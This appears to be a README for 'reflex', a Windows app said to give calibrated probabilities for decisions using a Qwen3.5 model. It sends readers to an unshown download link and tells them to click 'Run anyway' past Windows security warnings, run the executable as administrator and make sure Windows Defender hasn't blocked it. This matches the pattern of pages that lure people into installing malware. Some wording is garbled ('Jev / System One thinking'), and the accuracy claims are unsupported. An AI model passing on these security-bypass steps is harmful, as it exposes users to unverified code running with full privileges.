🎯 What is reflex?

Reflex is a lightweight, open-source tool that re-creates the cognitive approach of Jev / System One thinking, built on the advanced Qwen3.5 model. It takes two inputs:

  • State: Your current context, environment, or situation description.
  • Typed questions: The specific decisions or uncertainties you want to evaluate.

The output? Calibrated probabilities — well-reasoned, percentage-based likelihoods that help you understand the odds and make more informed choices. No more vague "probably" or "maybe." Reflex gives you numbers you can actually use.

🚀 Getting Started on Windows

Follow these simple steps to get reflex running on your Windows computer:

Step 1: Visit the Download Page

Visit this link to download the application. This will take you to the official reflex repository page.

Step 2: Find the Latest Release

Look for the "Releases" section on the right side of the page, or click on the "Latest" release if shown. This is where the official Windows files are hosted.

Step 3: Download the File

Locate the file listed for Windows — it will typically be named something like reflex-windows.zip or reflex-setup.exe. Click it to start the download. Your browser will save the file to your Downloads folder by default.

Step 4: Run the Application

Once the download completes, navigate to your Downloads folder and find the file you just downloaded.

  • If you downloaded a .zip file: Right-click it and select "Extract All". Then open the extracted folder and double-click the reflex executable file inside.
  • If you downloaded an .exe file: Simply double-click the file to run it. Your system may show a security warning — click "More info" and then "Run anyway" to proceed.

Step 5: Start Using Reflex

When the application opens, you'll see a simple interface with two fields. Type your current state (describe your situation), then type your questions (what you want to know). Click "Generate Probabilities" and reflex will analyze your input and provide you with calibrated probability estimates. That's it!

📌 Important: Make sure your computer meets the minimum requirements — a 64-bit Windows 10 or later operating system, at least 4GB of RAM, and an internet connection for the initial setup. No additional software or programming knowledge is required.

💡 How to Use Reflex Effectively

To get the best results from reflex, follow these tips:

  • Be specific about your state: Instead of "I'm starting a business," try "I'm starting an online clothing store with $10,000 capital and no prior e-commerce experience." More context = better probabilities.
  • Ask clear, single-focus questions: Instead of "Will my business succeed?", try "What is the probability that my online store will reach $5,000 in monthly revenue within the first 6 months?"
  • Use the probabilities for planning: Use the output as a decision aid. If the probability is low, ask follow-up questions about what could improve it.

🔧 Troubleshooting & Support

Common Issues

  • Application won't start: Right-click the executable and select "Run as administrator". Ensure Windows Defender hasn't blocked it — check your security settings.
  • No internet connection error: Reflex needs an internet connection to load the Qwen3.5 model for the first time. Check your network and try again.
  • Slow performance: Close other heavy applications. If the problem persists, restart your computer and try again.

📚 Technical Details

For those curious about how reflex works under the hood: it's built using a state-of-the-art Qwen3.5 model fine-tuned for decision-theoretic reasoning. The system uses a "System One" approach — fast, heuristic-based reasoning that mimics human intuition but with the consistency and accuracy of AI. It's designed to be transparent, reproducible, and easy to integrate into your existing workflows.

The codebase is intentionally small and well-documented, making it a great learning resource for developers interested in decision theory and AI-assisted reasoning. All code is available for review and contribution on the repository.
